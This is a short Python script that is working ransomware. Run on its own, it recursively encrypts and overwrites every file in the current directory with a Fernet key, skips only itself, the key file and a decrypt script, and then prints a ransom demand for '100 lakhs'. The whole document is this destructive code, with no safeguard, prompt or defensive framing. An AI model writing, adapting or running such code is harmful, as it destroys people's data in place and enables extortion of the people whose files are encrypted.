#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

def encrypt_files(folder_path):
    # Generate a unique encryption key
    key = Fernet.generate_key()
    with open(os.path.join(folder_path, "thekey.key"), "wb") as thekey:
        thekey.write(key)

    # Walk through the directory structure
    for root, _, files in os.walk(folder_path):
        for file in files:
            if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
                continue
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file_path, "wb") as thefile:
                thefile.write(contents_encrypted)

    print("Your files have been encrypted. Send me 100 lakhs.")

# Start encryption from the current directory
encrypt_files(".")
